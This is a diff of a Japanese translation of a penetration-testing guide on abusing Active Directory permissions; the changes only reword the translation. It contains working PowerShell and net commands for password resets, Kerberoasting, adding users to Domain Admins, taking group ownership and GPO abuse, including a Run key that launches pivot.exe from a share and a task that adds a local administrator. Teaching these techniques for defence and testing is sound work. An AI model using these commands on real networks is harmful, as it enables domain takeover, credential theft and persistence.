@@ -2,14 +2,14 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**このページは主に** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **および** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**の技術の要約です。詳細については、元の記事を確認してください。**
+**このページは主に** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **および** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**からの技術の概要です。詳細については、元の記事を確認してください。**
 
 ## **ユーザーに対するGenericAll権限**
 
-この権限は、攻撃者にターゲットユーザーアカウントに対する完全な制御を与えます。`Get-ObjectAcl`コマンドを使用して`GenericAll`権限が確認されると、攻撃者は次のことができます：
+この権限は、攻撃者にターゲットユーザーアカウントに対する完全な制御を与えます。`Get-ObjectAcl`コマンドを使用して`GenericAll`権限が確認されると、攻撃者は以下を行うことができます：
 
 - **ターゲットのパスワードを変更**: `net user <username> <password> /domain`を使用して、攻撃者はユーザーのパスワードをリセットできます。
-- **ターゲット化されたKerberoasting**: ユーザーアカウントにSPNを割り当ててkerberoastableにし、次にRubeusとtargetedKerberoast.pyを使用してチケット授与チケット（TGT）ハッシュを抽出し、クラックを試みます。
+- **ターゲット化されたKerberoasting**: ユーザーのアカウントにSPNを割り当ててkerberoastableにし、次にRubeusとtargetedKerberoast.pyを使用してチケット授与チケット（TGT）ハッシュを抽出し、クラックを試みます。
 ```powershell
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
@@ -21,9 +21,9 @@ Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
 ## **GenericAll権限のグループ**
 
-この特権により、攻撃者は`Domain Admins`のようなグループに対して`GenericAll`権限を持っている場合、グループメンバーシップを操作することができます。`Get-NetGroup`を使用してグループの識別名を特定した後、攻撃者は次のことができます：
+この特権により、攻撃者は`Domain Admins`のようなグループに`GenericAll`権限を持っている場合、グループメンバーシップを操作することができます。`Get-NetGroup`を使用してグループの識別名を特定した後、攻撃者は次のことができます：
 
-- **自分をDomain Adminsグループに追加する**：これは、直接コマンドを使用するか、Active DirectoryやPowerSploitのようなモジュールを使用して行うことができます。
+- **自分自身をDomain Adminsグループに追加する**：これは、直接コマンドを使用するか、Active DirectoryやPowerSploitのようなモジュールを使用して行うことができます。
 ```powershell
 net group "domain admins" spotless /add /domain
 Add-ADGroupMember -Identity "domain admins" -Members spotless
@@ -38,9 +38,9 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 
 ## **WriteProperty on Group**
 
-ユーザーが特定のグループ（例：`Domain Admins`）のすべてのオブジェクトに対して`WriteProperty`権限を持っている場合、以下が可能です：
+特定のグループ（例：`Domain Admins`）のすべてのオブジェクトに対して`WriteProperty`権利を持つユーザーは、以下を行うことができます：
 
-- **Add Themselves to the Domain Admins Group**: `net user`と`Add-NetGroupUser`コマンドを組み合わせることで達成可能であり、この方法はドメイン内での権限昇格を可能にします。
+- **自分自身をDomain Adminsグループに追加する**: `net user`と`Add-NetGroupUser`コマンドを組み合わせることで達成可能で、この方法はドメイン内での権限昇格を可能にします。
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
@@ -72,7 +72,7 @@ rpcclient -U KnownUsername 10.10.10.192
 ```
 ## **グループのWriteOwner**
 
-攻撃者がグループに対して`WriteOwner`権限を持っていることが判明した場合、彼らはそのグループの所有権を自分自身に変更することができます。これは、問題のグループが`Domain Admins`である場合に特に影響が大きく、所有権を変更することでグループの属性やメンバーシップに対するより広範な制御が可能になります。このプロセスには、`Get-ObjectAcl`を使用して正しいオブジェクトを特定し、その後`Set-DomainObjectOwner`を使用して所有者をSIDまたは名前で変更することが含まれます。
+攻撃者がグループに対して`WriteOwner`権限を持っていることがわかった場合、彼らはそのグループの所有権を自分自身に変更することができます。これは、問題のグループが`Domain Admins`である場合に特に影響が大きく、所有権を変更することでグループの属性やメンバーシップに対するより広範な制御が可能になります。このプロセスは、`Get-ObjectAcl`を使用して正しいオブジェクトを特定し、その後`Set-DomainObjectOwner`を使用して、SIDまたは名前で所有者を変更することを含みます。
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
@@ -86,7 +86,7 @@ Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\
 ```
 ## **GenericWrite on Group**
 
-この特権を持つ攻撃者は、特定のグループに自分自身や他のユーザーを追加するなど、グループメンバーシップを操作できます。このプロセスには、資格情報オブジェクトを作成し、それを使用してグループからユーザーを追加または削除し、PowerShellコマンドでメンバーシップの変更を確認することが含まれます。
+この特権を持つ攻撃者は、特定のグループに自分自身や他のユーザーを追加するなど、グループメンバーシップを操作できます。このプロセスには、資格情報オブジェクトを作成し、それを使用してユーザーをグループに追加または削除し、PowerShellコマンドでメンバーシップの変更を確認することが含まれます。
 ```powershell
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
@@ -106,7 +106,7 @@ $ADSI.psbase.commitchanges()
 ```
 ## **ドメイン上のレプリケーション (DCSync)**
 
-DCSync攻撃は、ドメイン上の特定のレプリケーション権限を利用して、ドメインコントローラーを模倣し、ユーザーの資格情報を含むデータを同期します。この強力な技術は、`DS-Replication-Get-Changes`のような権限を必要とし、攻撃者がドメインコントローラーへの直接アクセスなしにAD環境から機密情報を抽出することを可能にします。[**DCSync攻撃の詳細はこちら。**](../dcsync.md)
+DCSync攻撃は、ドメイン上の特定のレプリケーション権限を利用して、ドメインコントローラーを模倣し、ユーザーの資格情報を含むデータを同期します。この強力な手法は、`DS-Replication-Get-Changes`のような権限を必要とし、攻撃者がドメインコントローラーへの直接アクセスなしにAD環境から機密情報を抽出することを可能にします。[**DCSync攻撃の詳細はこちら。**](../dcsync.md)
 
 ## GPO委任 <a href="#gpo-delegation" id="gpo-delegation"></a>
 
@@ -122,7 +122,7 @@ DCSync攻撃は、ドメイン上の特定のレプリケーション権限を�
 
 **特定のコンピュータに適用されたポリシー**: 特定のコンピュータに適用されているポリシーを確認するには、`Get-DomainGPO`のようなコマンドを利用できます。
 
-**特定のポリシーが適用されたOU**: 特定のポリシーに影響を受ける組織単位 (OU) を特定するには、`Get-DomainOU`を使用できます。
+**特定のポリシーが適用されたOU**: 特定のポリシーの影響を受ける組織単位 (OU) を特定するには、`Get-DomainOU`を使用できます。
 
 ### GPOの悪用 - New-GPOImmediateTask
 
@@ -130,9 +130,9 @@ DCSync攻撃は、ドメイン上の特定のレプリケーション権限を�
 ```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
-### GroupPolicy モジュール - GPOの悪用
+### GroupPolicyモジュール - GPOの悪用
 
-GroupPolicy モジュールがインストールされている場合、新しい GPO の作成とリンク、影響を受けたコンピュータでバックドアを実行するためのレジストリ値などの設定が可能です。この方法では、GPO を更新し、実行のためにユーザーがコンピュータにログインする必要があります。
+GroupPolicyモジュールがインストールされている場合、新しいGPOの作成とリンク、影響を受けたコンピュータでバックドアを実行するためのレジストリ値などの設定が可能です。この方法では、GPOを更新し、実行のためにユーザーがコンピュータにログインする必要があります。
 ```powershell
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
@@ -149,15 +149,15 @@ GPOの更新は通常90分ごとに行われます。このプロセスを迅速
 
 ### 背景
 
-特定のGPO、例えば`Misconfigured Policy`のスケジュールされたタスクを検査すると、`evilTask`のようなタスクの追加が確認できます。これらのタスクは、システムの動作を変更したり、特権を昇格させたりすることを目的としたスクリプトやコマンドラインツールを通じて作成されます。
+特定のGPO、例えば`Misconfigured Policy`のスケジュールされたタスクを検査すると、`evilTask`のようなタスクの追加が確認できます。これらのタスクは、システムの動作を変更したり特権を昇格させたりすることを目的としたスクリプトやコマンドラインツールを通じて作成されます。
 
-`New-GPOImmediateTask`によって生成されたXML構成ファイルに示されているタスクの構造は、実行されるコマンドやそのトリガーを含むスケジュールされたタスクの詳細を概説しています。このファイルは、GPO内でスケジュールされたタスクがどのように定義され、管理されるかを示しており、ポリシーの強制の一環として任意のコマンドやスクリプトを実行する方法を提供します。
+`New-GPOImmediateTask`によって生成されたXML構成ファイルに示されているタスクの構造は、スケジュールされたタスクの具体的な内容を示しています - 実行されるコマンドやそのトリガーを含みます。このファイルは、GPO内でスケジュールされたタスクがどのように定義され管理されるかを表しており、ポリシーの強制の一環として任意のコマンドやスクリプトを実行する方法を提供します。
 
 ### ユーザーとグループ
 
-GPOは、ターゲットシステム上のユーザーおよびグループのメンバーシップを操作することも可能です。ユーザーとグループのポリシーファイルを直接編集することで、攻撃者はローカルの`administrators`グループなどの特権グループにユーザーを追加できます。これは、GPO管理権限の委任を通じて可能であり、新しいユーザーを含めたり、グループメンバーシップを変更したりするためのポリシーファイルの修正を許可します。
+GPOは、ターゲットシステム上のユーザーおよびグループのメンバーシップを操作することも可能です。ユーザーとグループのポリシーファイルを直接編集することで、攻撃者はローカルの`administrators`グループなどの特権グループにユーザーを追加できます。これは、GPO管理権限の委任を通じて可能であり、ポリシーファイルを修正して新しいユーザーを含めたりグループメンバーシップを変更したりすることを許可します。
 
-ユーザーとグループのXML構成ファイルは、これらの変更がどのように実施されるかを概説しています。このファイルにエントリを追加することで、特定のユーザーに影響を受けたシステム全体で昇格された特権を付与することができます。この方法は、GPO操作を通じた特権昇格の直接的なアプローチを提供します。
+ユーザーとグループのXML構成ファイルは、これらの変更がどのように実施されるかを示しています。このファイルにエントリを追加することで、特定のユーザーに影響を受けるシステム全体で特権を付与することができます。この方法は、GPO操作を通じた特権昇格の直接的なアプローチを提供します。
 
 さらに、ログオン/ログオフスクリプトの活用、オートランのためのレジストリキーの変更、.msiファイルを介したソフトウェアのインストール、サービス構成の編集など、コードを実行したり持続性を維持したりするための追加の方法も考慮できます。これらの技術は、GPOの悪用を通じてターゲットシステムへのアクセスを維持し、制御するためのさまざまな手段を提供します。
 
